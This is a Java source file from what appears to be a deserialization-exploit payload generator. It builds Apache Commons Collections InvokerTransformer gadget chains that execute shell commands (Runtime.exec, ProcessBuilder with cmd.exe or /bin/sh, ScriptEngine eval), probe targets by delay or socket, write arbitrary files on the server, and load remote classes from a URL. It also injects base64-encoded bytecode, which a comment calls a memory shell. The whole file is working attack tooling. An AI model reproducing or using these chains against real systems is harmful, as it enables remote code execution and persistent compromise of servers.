package com.ppp.sinks;

import com.ppp.JavaClassBuilder;
import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.maker.Encoder;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.concurrent.TimeUnit;

/**
 * @author Whoopsunix
 */
@Sink({Sink.InvokerTransformer3})
public class InvokerTransformer3 {
    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
    public Transformer[] runtime(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();

        return new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{command}),
                new ConstantTransformer(1)};
    }

    /**
     * 命令执行 ProcessBuilder
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.ProcessBuilder})
    public Transformer[] processBuilder(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();
        String os = sinksHelper.getOs();

        Transformer[] transformers = new Transformer[0];
        if (os != null && os.toLowerCase().contains(EnchantType.WIN)) {
            transformers = new Transformer[]{
                    new ConstantTransformer(ProcessBuilder.class),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{
                            Class[].class}, new Object[]{new Class[]{String[].class}}),
                    new InvokerTransformer("newInstance", new Class[]{
                            Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
                    new InvokerTransformer("start", new Class[]{}, new Object[]{}),
                    new ConstantTransformer(1)};
        } else {
            transformers = new Transformer[]{
                    new ConstantTransformer(ProcessBuilder.class),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{
                            Class[].class}, new Object[]{new Class[]{String[].class}}),
                    new InvokerTransformer("newInstance", new Class[]{
                            Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
                    new InvokerTransformer("start", new Class[]{}, new Object[]{}),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }

    /**
     * ScriptEngine
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.ScriptEngine})
    public Transformer[] scriptEngine(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();

        String code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
        return new Transformer[]{
                new ConstantTransformer(ScriptEngineManager.class),
                new InstantiateTransformer(new Class[]{}, new Object[]{}),
                new InvokerTransformer("getEngineByName", new Class[]{
                        String.class}, new Object[]{"JavaScript"}),
                new InvokerTransformer("eval", new Class[]{
                        String.class}, new Object[]{code}),
                new ConstantTransformer(1)};
    }

    /**
     * 线程延时
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Sleep})
    public Transformer[] sleep(SinksHelper sinksHelper) {
        String sleep = sinksHelper.getSleep();
        Long sleepTime = sinksHelper.getSleepTime();

        Transformer[] transformers = null;
        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
            transformers = new Transformer[]{
                    new ConstantTransformer(TimeUnit.class),
                    new InvokerTransformer("getDeclaredField", new Class[]{
                            String.class}, new Object[]{
                            "SECONDS"}),
                    new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
                    new ConstantTransformer(1)};
        } else {
            sleepTime = sleepTime * 1000L;
            transformers = new Transformer[]{
                    new ConstantTransformer(Thread.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "currentThread", null}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, null}),
                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }

    /**
     * Socket 探测
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Socket})
    public Transformer[] socket(SinksHelper sinksHelper) {
        String thost = sinksHelper.getHost();

        String[] hostSplit = thost.split("[:]");
        String host = hostSplit[0];
        int port = 80;
        if (hostSplit.length == 2)
            port = Integer.parseInt(hostSplit[1]);

        return new Transformer[]{
                new ConstantTransformer(Socket.class),
                new InstantiateTransformer(new Class[]{String.class, int.class}, new Object[]{host, port}),
                new ConstantTransformer(1)};
    }

    /**
     * 文件写入
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.FileWrite})
    public Transformer[] fileWrite(SinksHelper sinksHelper) throws Exception {
        String serverFilePath = sinksHelper.getServerFilePath();
        String localFilePath = sinksHelper.getLocalFilePath();
        String fileContent = sinksHelper.getFileContent();

        byte[] contentBytes = new byte[]{};

        if (localFilePath != null) {
            try {
                FileInputStream fileInputStream = new FileInputStream(localFilePath);
                contentBytes = new byte[fileInputStream.available()];
                fileInputStream.read(contentBytes);
                fileInputStream.close();
            } catch (Exception e) {
                Printer.error("File read error");
            }
        } else if (fileContent != null) {
            contentBytes = fileContent.getBytes();
        }

        return new Transformer[]{
                new ConstantTransformer(FileOutputStream.class),
                new InstantiateTransformer(
                        new Class[]{String.class},
                        new Object[]{serverFilePath}
                ),
                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
                new ConstantTransformer(1)};
    }

    /**
     * 远程类加载
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.RemoteLoad})
    public Transformer[] remoteLoad(SinksHelper sinksHelper) throws Exception {
        String url = sinksHelper.getUrl();
        String remoteClassName = sinksHelper.getRemoteClassName();
        Object constructor = sinksHelper.getConstructor();

        Transformer[] transformers;

        // 构造方法
        if (constructor != null) {
            // 转为 Integer
            try {
                constructor = Integer.parseInt(constructor.toString());
            } catch (Exception e) {
            }

            Class constructorType = constructor.getClass();
            Object args = constructor;

            transformers = new Transformer[]{
                    new ConstantTransformer(URLClassLoader.class),
                    new InstantiateTransformer(
                            new Class[]{URL[].class},
                            new Object[]{new URL[]{new URL(url)}}
                    ),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{constructorType}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}),
                    new ConstantTransformer(1)};
        } else {
            // 默认 static 无参构造
            transformers = new Transformer[]{
                    new ConstantTransformer(URLClassLoader.class),
                    new InstantiateTransformer(
                            new Class[]{URL[].class},
                            new Object[]{new URL[]{new URL(url)}}
                    ),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
                    new InstantiateTransformer(null, null),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }

    /**
     * 本地类加载
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.LocalLoad})
    public Transformer[] localLoad(SinksHelper sinksHelper) throws Exception {
        String loadFunction = sinksHelper.getLoadFunction();

        /**
         * 字节码加载
         */
        byte[] classBytes = null;
        String javaClassName = null;
        // 内存马
        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();

        if (javaClassHelper != null) {
            classBytes = JavaClassBuilder.build(javaClassHelper);
            javaClassName = javaClassHelper.getJavaClassName();
        }


        if (classBytes == null) {
            Printer.error("Miss classBytes");
        }
        if (javaClassName == null) {
            Printer.error("Miss javaClassName");
        }


        Transformer[] transformers;
        if (loadFunction != null && loadFunction.equalsIgnoreCase(EnchantType.RHINO)) {
            /**
             * org.mozilla.javascript.DefiningClassLoader.defineClass()
             * 需要 org.mozilla:rhino 依赖
             */
            transformers = new Transformer[]{
                    new ConstantTransformer(Class.forName("org.mozilla.javascript.DefiningClassLoader")),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                    new InvokerTransformer("defineClass",
                            new Class[]{String.class, byte[].class}, new Object[]{javaClassName, classBytes}),
                    new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
                    new ConstantTransformer(1)};
        } else {
            /**
             * javax.script.ScriptEngineManager
             */
            String b64 = Encoder.base64encoder(classBytes);

            String code = "var data=\"" + b64 + "\";\n" +
                    "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                    "var object = aClass.newInstance();\n" +
                    "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
                    "var classLoader=new java.lang.ClassLoader() {};\n" +
                    "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "defineClassMethod.setAccessible(true);\n" +
                    "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "loadedClass.newInstance();";

            transformers = new Transformer[]{
                    new ConstantTransformer(ScriptEngineManager.class),
                    new InstantiateTransformer(new Class[]{}, new Object[]{}),
                    new InvokerTransformer("getEngineByName", new Class[]{
                            String.class}, new Object[]{"JavaScript"}),
                    new InvokerTransformer("eval", new Class[]{
                            String.class}, new Object[]{code}),
                    new ConstantTransformer(1)};
        }


        return transformers;
    }
}
